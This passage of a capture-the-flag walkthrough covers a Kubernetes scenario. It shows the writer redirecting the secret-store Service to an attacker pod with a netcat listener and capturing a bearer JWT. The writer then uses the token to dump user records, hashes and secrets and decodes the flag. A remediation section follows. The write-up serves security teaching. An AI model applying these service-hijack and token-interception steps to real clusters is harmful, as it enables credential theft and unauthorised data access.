                    "application/json"
                ],
                "tags": [
                    "users"
                ],
                "summary": "get user by id",
                "responses": {
                    "200": {
                        "description": "OK",
                        "schema": {
                            "type": "string"
                        }
                    }
                }
            },
            "put": {
                "description": "update a user (put)",
                "consumes": [
                    "application/json"
                ],
                "produces": [
                    "application/json"
                ],
                "tags": [
                    "users"
                ],
                "summary": "update a user",
                "responses": {
                    "204": {
                        "description": "No Content",
                        "schema": {
                            "type": "string"
                        }
                    }
                }
            },
            "delete": {
                "description": "delete a user",
                "consumes": [
                    "application/json"
                ],
                "produces": [
                    "application/json"
                ],
                "tags": [
                    "users"
                ],
                "summary": "delete a user",
                "responses": {
                    "204": {
                        "description": "No Content",
                        "schema": {
                            "type": "string"
                        }
                    }
                }
            }
        }
    }
}
```

Great, we've found the API specification for the secret-store. Let's try doing a simple `GET` request to the `/users` endpoint.

```bash
root@yamlidator-78f7dfb58f-564rx:/# curl http://secret-store.private-services.svc.cluster.local:5050/api/v1/users
<rivate-services.svc.cluster.local:5050/api/v1/users
  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
                                 Dload  Upload   Total   Spent    Left  Speed
100    32  100    32    0     0   6400      0 --:--:-- --:--:-- --:--:--  6400
No Authorization header provided
```

It seems we are missing a parameter for the request, specifically an authorization header. This is simple enough to add.

```bash
curl http://secret-store.private-services.svc.cluster.local:5050/api/v1/users -H 'Authorization: Bearer wakeward'
<50/api/v1/users -H 'Authorization: Bearer wakeward'
  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
                                 Dload  Upload   Total   Spent    Left  Speed
100    23  100    23    0     0   3285      0 --:--:-- --:--:-- --:--:--  3285
Bearer token is invalid
```

But as expected, we receive a response that our `Bearer token is invalid`. Based on the fact we can see Dex is deployed on the cluster. we can safely assume we need an active `jwt` token to call the secret store. This will require a little more thought.

### Step 6: Abusing the secret store service to obtain a JWT token

If we recall at the beginning of the scenario, the challenge description stated that "user store which is actively used for storing secrets". This suggests that a consistent number of requests are being made to the secret store (as we know it has the users endpoint). To be successful, these requests must be using a valid `jwt` token. If we can find a way to intercept the request and obtain the `jwt` token, we can then use it to call the secret store.

Going back to our permissions on the `private-services` namespace, we can see that we have permissions to create pods and exec into them. We could try to `exec` into the `secret-store` pod to obtain a local shell but we'll soon find out this is not possible and likely the container is running a minimal image.

On top of the permissions of the pod, we also have the ability to modify the secret store service which we could use to redirect a request to another netcat listener. Let's create a pod with a netcat listener in teh `private-services` namespace.

> Note: We already have a container image with `nc` installed and we can leverage that again in this context.

```yaml
apiVersion: v1
kind: Pod
metadata:
  name: tools
  namespace: private-services
  labels:
    app: terminal
spec:
  containers:
  - image: docker.io/controlplaneoffsec/identity-theft:public-terminal
    command: ["sleep", "2d"]
    name: tools
  restartPolicy: Always
```

The significant part of the manifest is the label `app: terminal` which we will use to target the pod with our service. Let's deploy the pod.

```bash
root@yamlidator-78f7dfb58f-564rx:/# kubectl apply -f pod.yaml
kubectl apply -f pod.yaml
pod/tools created
```

With that in place, let's create a service manifest to redirect the request to our pod.

```yaml
apiVersion: v1
kind: Service
metadata:
  name: secret-store
  namespace: private-services
spec:
  selector:
    app: terminal
  ports:
  - port: 5050
    targetPort: 9090
    protocol: TCP
```

Once again, we see our label `app: terminal` as a selector and provide a target port of `9090`. Let's deploy the service.

```bash
root@yamlidator-78f7dfb58f-564rx:/# kubectl apply -f service.yaml
kubectl apply -f service.yaml
service/secret-store configured
```

The service should redirect requests to our pod, we just need to `exec` in and start our netcat listener.

```bash
kubectl exec -it tools -n private-services -- /bin/bash

id
uid=1000(elit3hex0r) gid=1000(elit3hex0r) groups=1000(elit3hex0r)
nc -nlvp 9090
Ncat: Version 7.94SVN ( https://nmap.org/ncat )
Ncat: Listening on [::]:9090
Ncat: Listening on 0.0.0.0:9090
GET /api/v1/users HTTP/1.1
Host: secret-store.private-services.svc.cluster.local:5050
User-Agent: curl/8.1.1
Accept: */*
Authorization: Bearer eyJhbGciOiJSUzI1NiIsImtpZCI6Ijc3ZDA0YzViNTllYWI3Njk5MWZhZGRkMDE0OTRiYjc1MzM5NmZkYmIifQ.eyJpc3MiOiJodHRwOi8vZGV4LmRleC5zdmMuY2x1c3Rlci5sb2NhbDo1NTU2L2RleCIsInN1YiI6IkNpUXdPR0U0TmpnMFlpMWtZamc0TFRSaU56TXRPVEJoT1MwelkyUXhOall4WmpVME5qWVNCV3h2WTJGcyIsImF1ZCI6InBvZC1jaGVja2VyIiwiZXhwIjoxNzAwNjU4Nzg1LCJpYXQiOjE3MDA1NzIzODUsImF0X2hhc2giOiJhQWZqcG12NnBGa3ltN2hCSTNSRDJBIiwiZW1haWwiOiJhZG1pbkBwb2QtY2hlY2tlci5sb2NhbCIsImVtYWlsX3ZlcmlmaWVkIjp0cnVlLCJuYW1lIjoiYWRtaW4ifQ.KUlXKzGyeChUzqnQR3Bu57TobcY6SIfQ-R7LYeB6yNX-VIu9NuFgTVQj03862Prw_49N1P1zJnyj8C_XCP3DyxYczzW0xf0Qnu1qlA7pCpkdTA8ogPopiyp9SftvQ1456EclA1jjRacJrZfReWXmdjYximVUIFbpn0DZhIxG7XNZ4kdDVbiG31LcdPOym9VkYzEmSVt5Rxz8B-poPN4avlxhjNAxIgK6cIyIM6mDYiuk1BGy0tuTjWQ1s1G0UnVDKuFEywe35ZqvQjP7_heOY5laujZUBCWXCN4nRvMnIj0awXWd-ghqrD3CQv9nAnKTGHMbV8zHF0R_VD8zoAl47w

Ncat: Connection from 192.168.11.198:43404.
```

Success! We now have a bearer token to use to access the secret store. As we've modified the service, we either have to restore it back to it's original state so that requests are routed to the underlying pod or we can send a request directly to the pod. Let's try the latter but we need to know the pod IP address. We can get this by running the following command.

```bash
root@yamlidator-78f7dfb58f-564rx:/# kubectl get pods -n private-services
kubectl get pods -n private-services
NAME                            READY   STATUS    RESTARTS   AGE
secret-store-59785db8d6-2qgmt   1/1     Running   0          3h30m
tools                           1/1     Running   0          3m13s

root@yamlidator-78f7dfb58f-564rx:/# kubectl get pods secret-store-59785db8d6-2qgmt -n private-services -ojson | jq -r '.status.podIP'
< -n private-services -ojson | jq -r '.status.podIP'
192.168.109.67
```

We can now send a request directly to the pod.

```bash
curl http://192.168.109.67:5050/api/v1/users -H 'Authorization: Bearer eyJhbGciOiJSUzI1NiIsImtpZCI6Ijc3ZDA0YzViNTllYWI3Njk5MWZhZGRkMDE0OTRiYjc1MzM5NmZkYmIifQ.eyJpc3MiOiJodHRwOi8vZGV4LmRleC5zdmMuY2x1c3Rlci5sb2NhbDo1NTU2L2RleCIsInN1YiI6IkNpUXdPR0U0TmpnMFlpMWtZamc0TFRSaU56TXRPVEJoT1MwelkyUXhOall4WmpVME5qWVNCV3h2WTJGcyIsImF1ZCI6InBvZC1jaGVja2VyIiwiZXhwIjoxNzAwNjU4Nzg1LCJpYXQiOjE3MDA1NzIzODUsImF0X2hhc2giOiJhQWZqcG12NnBGa3ltN2hCSTNSRDJBIiwiZW1haWwiOiJhZG1pbkBwb2QtY2hlY2tlci5sb2NhbCIsImVtYWlsX3ZlcmlmaWVkIjp0cnVlLCJuYW1lIjoiYWRtaW4ifQ.KUlXKzGyeChUzqnQR3Bu57TobcY6SIfQ-R7LYeB6yNX-VIu9NuFgTVQj03862Prw_49N1P1zJnyj8C_XCP3DyxYczzW0xf0Qnu1qlA7pCpkdTA8ogPopiyp9SftvQ1456EclA1jjRacJrZfReWXmdjYximVUIFbpn0DZhIxG7XNZ4kdDVbiG31LcdPOym9VkYzEmSVt5Rxz8B-poPN4avlxhjNAxIgK6cIyIM6mDYiuk1BGy0tuTjWQ1s1G0UnVDKuFEywe35ZqvQjP7_heOY5laujZUBCWXCN4nRvMnIj0awXWd-ghqrD3CQv9nAnKTGHMbV8zHF0R_VD8zoAl47w'
<RvMnIj0awXWd-ghqrD3CQv9nAnKTGHMbV8zHF0R_VD8zoAl47w'
  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
                                 Dload  Upload   Total   Spent    Left  Speed
100  1478  100  1478    0     0   481k      0 --:--:-- --:--:-- --:--:--  721k
[{"ID":1,"CreatedAt":"0001-01-01T00:00:00Z","UpdatedAt":"0001-01-01T00:00:00Z","DeletedAt":null,"email":"admin@pod-checker.local","firstName":"ultra","lastName":"violet","password":"$2a$12$r3WmQMiMtfzEDN.2O59x.eClp3NnygoaTDhBtT/sh0kO3oXI8jj82","secret":"cG9kY2hlY2tlcmF1dGg=","createdAt":"2023-11-21T09:45:25.077819Z","updatedAt":"2023-11-21T09:45:25.079044Z"},{"ID":2,"CreatedAt":"0001-01-01T00:00:00Z","UpdatedAt":"0001-01-01T00:00:00Z","DeletedAt":null,"email":"flag@pod-checker.local","firstName":"ctf","lastName":"flag","password":"$2a$12$u5IH.vnk5B3YTQ.jYLVcweV12WOhPE6Nipmzca4dCt8vWkshCTZCK","secret":"ZmxhZ19jdGZ7T19JX0RDX1dIQVRfWU9VX0hBVkVfRE9ORV9USEVSRX0=","createdAt":"2023-11-21T09:45:25.423482Z","updatedAt":"2023-11-21T09:45:25.424323Z"},{"ID":3,"CreatedAt":"0001-01-01T00:00:00Z","UpdatedAt":"0001-01-01T00:00:00Z","DeletedAt":null,"email":"db@pod-checker.local","firstName":"infra","lastName":"red","password":"$2a$12$9juleEPks.JIOHjnjeo/JemIId0D4mLDfg4qDRoYcZ5NhUsTKJrYK","secret":"ZGJzZWNyZXRzdG9yZWF1dGg=","createdAt":"2023-11-21T09:45:25.763395Z","updatedAt":"2023-11-21T09:45:25.76425Z"},{"ID":4,"CreatedAt":"0001-01-01T00:00:00Z","UpdatedAt":"0001-01-01T00:00:00Z","DeletedAt":null,"email":"wakeward@pod-checker.local","firstName":"kevin","lastName":"ward","password":"$2a$12$TmBw49S5n4eUZFsP6PEZsudtquQtS167pLSSi0OGpeXRG7yg80Ahe","secret":"aWhvcGV5b3VlbmpveWVkdGhpcyE=","createdAt":"2023-11-21T09:45:26.101292Z","updatedAt":"2023-11-21T09:45:26.102091Z"}]
```

Excellent, we have access to the secret store. Looking at the database entries, we can see one for `flag` and there two sensitive fields, `password` and `secret`. As the `password` field looks to be cryptographically hashed, let's focus on the `secret` field as it is likely to be base64 encoded.

```bash
echo "ZmxhZ19jdGZ7T19JX0RDX1dIQVRfWU9VX0hBVkVfRE9ORV9USEVSRX0=" | base64 -d
<DX1dIQVRfWU9VX0hBVkVfRE9ORV9USEVSRX0=" | base64 -d
flag_ctf{O_I_DC_WHAT_YOU_HAVE_DONE_THERE}
```

Congratulations, you have found the final flag and solved Identity Theft!

## Remediation and Security Considerations

The CTF scenario has been designed to provide an example of how an adversary with an initial foothold in a Kubernetes cluster via application vulnerability and leverage an assumed inaccessible service to elevate privileges and gain access to sensitive data. The following section will provide some guidance on how to remediate the vulnerabilities and improve the security posture of the cluster.

The obvious remediation is to fix the vulnerability in the `yamlidator` application by changing the `yaml_data = yaml.unsafe_load(prep_data)` to `yaml_data = yaml.safe_load(prep_data)` and to run vulnerability scanning on container images. Although this is an important step, vulnerabilities in applications can occur at anytime. The moment the container image is scanned for vulnerabilities (assuming it scans all the application code) it is analysed against the currently known vulnerabilities. If a new vulnerability is discovered, the container image will be vulnerable until a patch is released and rolled out.

Based on this we must always assume that a container is vulneable and apply defence in depth controls across the cluster. In this CTF scenario, we could remove `kubectl` from the `yamlidator` container and remove the `exec` and `patch` permissions from the service account. This would prevent an adversary from being able to modify the `secret-store` service and redirect requests to a malicious pod.
